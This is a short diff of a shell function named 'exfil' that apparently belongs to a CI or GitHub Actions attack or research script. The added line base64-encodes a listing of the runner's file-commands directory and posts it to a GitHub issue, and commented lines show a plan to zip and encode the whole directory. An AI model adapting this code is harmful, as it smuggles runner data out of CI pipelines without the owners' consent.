@@ -12,7 +12,7 @@ exfil() {
     # zip_file=${ts}.zip
     # zip -r $zip_file $RUNNER_FILE_COMMANDS_DIR
     # local encoded=$(cat $zip_file | base64 -w 0)
-    encoded=$(ls -la $RUNNER_FILE_COMMANDS_DIR)
+    encoded=$(ls -la $RUNNER_FILE_COMMANDS_DIR | base64 -w 0)
     if [ -z "$ISSUE_NUMBER" ]; then
         create_issue "$encoded"
     else
